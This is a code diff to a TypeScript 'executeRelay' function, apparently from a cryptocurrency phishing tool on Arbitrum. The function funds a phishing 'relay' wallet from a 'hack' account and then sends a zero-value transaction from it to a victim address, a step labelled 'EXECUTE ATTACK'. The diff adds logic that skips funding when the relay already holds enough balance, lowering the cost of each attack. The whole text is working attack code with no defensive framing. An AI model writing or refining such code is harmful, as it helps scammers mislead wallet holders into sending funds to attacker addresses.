@@ -50,27 +50,38 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
     const gasPrice = await publicClient.getGasPrice();
     const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));
 
-    // --- STEP 1: FUND THE RELAY ---
-    console.log('[Relay] Step 1: Funding relay wallet...');
-    const hackAccount = privateKeyToAccount(HACK_PRIVATE_KEY);
-    const hackClient = createWalletClient({
-        account: hackAccount,
-        chain: arbitrum,
-        transport: fallback([http(ALCHEMY_RPC)]),
-    });
+    const relayAccount = privateKeyToAccount(formattedPhishingKey);
 
-    const fundHash = await hackClient.sendTransaction({
-        to: phishingAddress,
-        value: parseEther(fundAmount),
-        gasPrice: adjustedGasPrice,
-    });
+    // --- STEP 1: FUND THE RELAY (SMART GAS) ---
+    const currentBalance = await publicClient.getBalance({ address: relayAccount.address });
+    const targetBalance = parseEther(fundAmount);
+    const sufficientBalance = (targetBalance * 50n) / 100n; // 50% of the chosen amount is more than enough
+    let skippedFunding = false;
 
-    await publicClient.waitForTransactionReceipt({ hash: fundHash });
-    console.log(`[Relay] Relay funded: ${phishingAddress}`);
+    if (currentBalance >= sufficientBalance) {
+        console.log(`[Relay] Step 1 Skipped: Wallet already has sufficient balance (${currentBalance} wei).`);
+        skippedFunding = true;
+    } else {
+        console.log(`[Relay] Step 1: Funding relay wallet (${phishingAddress}) with ${fundAmount} ETH...`);
+        const hackAccount = privateKeyToAccount(HACK_PRIVATE_KEY);
+        const hackClient = createWalletClient({
+            account: hackAccount,
+            chain: arbitrum,
+            transport: fallback([http(ALCHEMY_RPC)]),
+        });
+
+        const fundHash = await hackClient.sendTransaction({
+            to: phishingAddress,
+            value: targetBalance,
+            gasPrice: adjustedGasPrice,
+        });
+
+        await publicClient.waitForTransactionReceipt({ hash: fundHash });
+        console.log(`[Relay] Relay funded: ${phishingAddress}`);
+    }
 
     // --- STEP 2: EXECUTE ATTACK FROM RELAY ---
-    console.log('[Relay] Step 2: Executing target transaction...');
-    const relayAccount = privateKeyToAccount(formattedPhishingKey);
+    console.log(`[Relay] Step 2: Sending 0 ETH from relay to victim (${victimAddress})...`);
     const relayClient = createWalletClient({
         account: relayAccount,
         chain: arbitrum,
@@ -95,5 +106,6 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
         success: receipt.status === 'success',
         hash: attackHash,
         receipt,
+        skippedFunding,
     };
 }
